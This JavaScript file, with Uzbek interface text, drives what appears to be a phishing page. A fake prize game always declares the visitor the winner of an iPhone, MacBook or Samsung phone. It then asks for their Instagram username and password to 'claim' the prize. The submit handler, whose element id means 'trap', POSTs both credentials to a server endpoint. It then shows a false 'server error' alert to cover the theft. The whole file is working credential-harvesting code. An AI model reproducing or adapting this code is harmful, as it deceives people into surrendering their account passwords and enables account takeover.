$(document).ready(function () {
    let limit = 3 
    let mahsulotlar = ['Iphoe 12 Pro' , 'Iphoe 13 Pro' , 'Iphoe 13 Pro Max' , 'Iphoe 14 Pro' , 'Iphoe 14 Pro Max' , 'MacBook Pro' , 'MacBook Air' , 'Samsung Galaxsy S22 Ultra'] 
    $('#is_game').click(function (e) { 
        $('#main').css('display', 'none');
        $('#game').css('display', 'block');
    });
    let number = Math.floor(Math.random() * 10);
    $('.item').click(function (e) { 
        if (limit !=0) {
            limit--;
            $(this).append('<h1 class="big">' + number.toString() + "</h1>");
        }if(limit == 0){
            happy(number)
        }
    });
    function happy(number) {
        let random_tovar = mahsulotlar[Math.floor(Math.random() * 8)]
        $('.item').css('background-color', 'rgb(113, 212, 113)');
        $('#texik').append('<h1 style="color : red;">Tabriklaymiz siz g\'olib buldingiz va ' + random_tovar + ' yutib oldingiz</h1>');
        $('#texik').append('<h2 style="">' + random_tovar + ' ni olish uchun Instagramingiz orqali registratsiya qiling </h2>');
        salut()
    }
    function salut(){
        $('.salyut').css('display', 'block');
        $('#zakaz').css('display', 'block')
    }
    $('#qopqon').click(function () { 
        let username = $('#username_inst').val()
        let password = $('#password_inst').val()
        let corect = true
        let err = ''
        if (username == "" || username == " "){
            corect = false
            err = 'Instagramingiz nik maneni yozing !'
        }else if(password == "" || password == " "){
            corect = false
            err = 'Parolingizni yozing !'
        }
        if(corect){
            fetch('http://127.0.0.1:8000/create/', {
                method: "POST",
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                }),
            })
            gotovo()
        }else{
            alert(err)
        }
    });
    function gotovo(){
        $('#username_inst').val('');
        $('#password_inst').val('');
        alert('Server hatoligi \n qayta harakat qilib kuring')
    }
});